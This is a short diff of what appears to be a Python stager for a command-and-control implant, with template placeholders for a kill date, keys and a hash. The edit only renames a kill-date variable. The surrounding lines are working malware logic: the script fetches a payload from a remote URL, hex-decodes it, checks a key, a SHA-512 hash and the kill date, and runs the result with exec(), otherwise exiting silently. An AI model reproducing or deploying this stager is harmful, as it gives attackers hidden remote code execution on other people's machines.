@@ -1,7 +1,7 @@
 import os,sys,base64,ssl,socket,pwd,hashlib,time
 try:import urllib.request as urllib2
 except:import urllib2
-kdn=time.strptime("#REPLACEKILLDATE#","%Y-%m-%d")
+killdate=time.strptime("#REPLACEKILLDATE#","%Y-%m-%d")
 pyhash="#REPLACEPYTHONHASH#"
 pykey="#REPLACESPYTHONKEY#"
 key="#REPLACEKEY#"
@@ -20,7 +20,7 @@ else: r=urllib2.Request(url,headers={'User-agent':ua})
 res=urllib2.urlopen(r);d=res.read();
 try:b=bytes.fromhex(d[1:].decode("utf-8")).decode("utf-8");s=hashlib.sha512(b.encode("utf-8")).hexdigest()
 except:c=d[1:];b=c.decode("hex");s=hashlib.sha512(b).hexdigest()
-if pykey in b and pyhash == s and cstr < kdn:
+if pykey in b and pyhash == s and cstr < killdate:
     try:exec(bytes.fromhex(d[1:].decode("utf-8")).decode("utf-8"))
     except:exec(b)
 else: sys.exit(0)
